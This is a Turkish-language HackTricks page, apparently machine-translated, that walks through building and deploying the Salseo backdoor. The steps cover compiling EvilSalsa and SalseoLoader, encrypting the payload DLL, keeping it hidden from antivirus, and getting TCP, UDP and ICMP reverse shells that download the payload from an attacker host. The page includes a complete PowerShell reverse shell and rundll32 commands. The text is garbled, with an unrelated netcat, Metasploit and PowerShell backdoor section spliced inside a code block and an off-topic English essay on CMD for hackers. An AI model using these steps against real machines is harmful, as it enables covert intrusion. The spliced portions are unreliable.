# Salseo

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Derlemeleri Hazırlama

Kaynak kodunu github'dan indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio** yüklü olması gerekmektedir.

Bu projeleri, kullanacak olduğunuz Windows makinenin mimarisi için derleyin (Windows x64 destekliyorsa, onun için derleyin).

Visual Studio içinde **sol "Build" sekmesindeki "Platform Target"** seçeneğini kullanarak **mimariyi seçebilirsiniz**.

(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Properties"** seçeneğine tıklayın)

![](<../.gitbook/assets/image (132).png>)

Ardından, her iki projeyi de derleyin (Build -> Build Solution) (Loglarda yürütülebilir dosyanın yolunu göreceksiniz):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Arka Kapıyı Hazırlama

Öncelikle, **EvilSalsa.dll**'yi kodlamalısınız. Bunun için, python betiği **encrypterassembly.py**'yi kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

Windows işletim sistemi, birçok farklı backdoor yöntemiyle hedef alınabilir. Bu bölümde, Windows sistemlerine sızma ve backdoor oluşturma tekniklerini ele alacağız.

#### 1. Netcat

Netcat, birçok işletim sistemi üzerinde çalışabilen bir ağ aracıdır. Bir backdoor oluşturmak için kullanılabilir. Netcat'i hedef Windows makinesine yüklemek için aşağıdaki adımları izleyin:

1. Netcat'i indirin ve hedef Windows makinesine kopyalayın.
2. Komut istemini açın ve Netcat'in bulunduğu dizine gidin.
3. Aşağıdaki komutu kullanarak Netcat'i hedef Windows makinesine yükleyin:

   ```
   nc.exe -lvp <port>
   ```

   `<port>` yerine kullanmak istediğiniz bir port numarası belirleyin.

4. Netcat, hedef Windows makinesinde bir dinleme noktası oluşturacak ve gelen bağlantıları kabul edecektir.

#### 2. Metasploit Framework

Metasploit Framework, güvenlik testleri ve sızma testleri için kullanılan popüler bir araçtır. Metasploit Framework kullanarak Windows sistemlere sızma ve backdoor oluşturma işlemlerini gerçekleştirebilirsiniz. Aşağıdaki adımları izleyerek Metasploit Framework'ü kullanabilirsiniz:

1. Metasploit Framework'ü indirin ve kurun.
2. Metasploit Framework'ün konsol arayüzünü açın.
3. Hedef Windows makinesinin IP adresini ve port numarasını belirleyin.
4. Aşağıdaki komutu kullanarak hedef Windows makinesine bağlanın:

   ```
   use exploit/windows/<exploit_name>
   set RHOSTS <target_ip>
   set RPORT <target_port>
   exploit
   ```

   `<exploit_name>` yerine kullanmak istediğiniz bir exploit adı belirleyin. `<target_ip>` ve `<target_port>` ise hedef Windows makinesinin IP adresi ve port numarasıdır.

5. Metasploit Framework, hedef Windows makinesine bağlanacak ve backdoor oluşturacaktır.

#### 3. PowerShell

PowerShell, Windows işletim sisteminde yerleşik olarak bulunan bir komut satırı aracıdır. PowerShell'i kullanarak Windows sistemlere sızma ve backdoor oluşturma işlemlerini gerçekleştirebilirsiniz. Aşağıdaki adımları izleyerek PowerShell'i kullanabilirsiniz:

1. Komut istemini açın ve aşağıdaki komutu kullanarak PowerShell'i başlatın:

   ```
   powershell
   ```

2. PowerShell'de aşağıdaki komutu kullanarak hedef Windows makinesine bağlanın:

   ```
   $client = New-Object System.Net.Sockets.TCPClient("<target_ip>", <target_port>)
   $stream = $client.GetStream()
   [byte[]]$bytes = 0..65535|%{0}
   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
       $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
       $sendback = (iex $data 2>&1 | Out-String )
       $sendback2 = $sendback + "PS " + (pwd).Path + "> "
       $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
       $stream.Write($sendbyte,0,$sendbyte.Length)
       $stream.Flush()
   }
   $client.Close()
   ```

   `<target_ip>` ve `<target_port>` yerine hedef Windows makinesinin IP adresi ve port numarasını belirleyin.

3. PowerShell, hedef Windows makinesine bağlanacak ve backdoor oluşturacaktır.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Tamam, şimdi Salseo işlemini gerçekleştirmek için ihtiyacınız olan her şeye sahipsiniz: **kodlanmış EvilDalsa.dll** ve **SalseoLoader'ın ikili dosyası**.

**SalseoLoader.exe ikili dosyasını makineye yükleyin. Herhangi bir AV tarafından tespit edilmemeleri gerekiyor...**

## **Arka kapıyı çalıştırma**

### **TCP ters kabuk almak (HTTP üzerinden kodlanmış dll indirme)**

Unutmayın, ters kabuk dinleyici olarak bir nc başlatın ve kodlanmış evilsalsa'yı sunmak için bir HTTP sunucusu çalıştırın.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDP ters kabuk alma (SMB üzerinden kodlanmış dll indirme)**

Ters kabuk dinleyici olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu (impacket-smbserver) başlatmayı unutmayın.
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP ters kabuk alma (kurbanın içinde kodlanmış dll zaten bulunuyor)**

**Bu sefer ters kabuğu almak için istemci tarafında özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP Yanıtlarını Devre Dışı Bırakın:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### İstemciyi çalıştırın:

```bash
./client
```

Bu komut, istemci uygulamasını çalıştıracaktır.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Kurbanın içinde, salseo işlemini gerçekleştirelim:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoader'ı ana fonksiyonu dışa aktaran DLL olarak derleme

Visual Studio kullanarak SalseoLoader projesini açın.

### Ana fonksiyondan önce \[DllExport] ekleyin

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Bu projeye DllExport yükleyin

#### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm için NuGet Paketlerini Yönet...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'yi tıklayın (ve açılan pencereyi kabul edin)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Proje klasörünüzde **DllExport.bat** ve **DllExport\_Configure.bat** dosyaları görünecektir.

### DllExport'u kaldırın

**Kaldır**'ı tıklayın (evet, garip gelebilir ama bana güvenin, gereklidir)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### Visual Studio'yu kapatın ve DllExport\_configure'ı çalıştırın

Visual Studio'yu **kapatın**

Ardından, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı çalıştırın

**x64**'ü seçin (eğer bir x64 kutusu içinde kullanacaksanız, benim durumumda öyleydi), **System.Runtime.InteropServices**'i (DllExport için Namespace içinde) seçin ve **Uygula**'yı tıklayın

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### Projeyi tekrar Visual Studio ile açın

**\[DllExport]** artık hata olarak işaretlenmemelidir

![](<../.gitbook/assets/image (8) (1).png>)

### Çözümü derleyin

**Çıktı Türü = Sınıf Kitaplığı**'nı seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıktı türü = Sınıf Kitaplığı)

![](<../.gitbook/assets/image (10) (1).png>)

**x64** **platformunu** seçin (Proje --> SalseoLoader Özellikleri --> Derleme --> Platform hedefi = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Çözümü derlemek için: Derle --> Çözümü Derle (Yeni DLL'nin yolunu Çıktı konsolunda göreceksiniz)

### Oluşturulan Dll'yi test edin

Dll'yi test etmek istediğiniz yere kopyalayın ve yapıştırın.

Şunu çalıştırın:
```
rundll32.exe SalseoLoader.dll,main
```
Eğer herhangi bir hata görünmüyorsa, muhtemelen işlevsel bir DLL'ye sahipsiniz!!

## DLL kullanarak bir kabuk alın

Bir **HTTP** **sunucusu** kullanmayı ve bir **nc** **dinleyici** ayarlamayı unutmayın

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD provides a wide range of commands that can be used to perform various tasks, such as managing files and directories, running programs, configuring system settings, and more.

CMD is a powerful tool for both legitimate users and hackers. It can be used to execute malicious commands and carry out various hacking activities. Hackers can leverage CMD to create backdoors, gain unauthorized access to systems, execute remote commands, and perform other malicious actions.

As a hacker, it is important to understand CMD and its capabilities. By mastering CMD commands and techniques, you can effectively exploit vulnerabilities, gain control over systems, and achieve your hacking objectives. However, it is crucial to use this knowledge responsibly and ethically, adhering to legal and ethical boundaries.

In summary, CMD is a command-line interpreter in Windows that can be used for legitimate purposes as well as for hacking activities. Understanding CMD and its commands is essential for hackers to carry out successful attacks and achieve their objectives.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
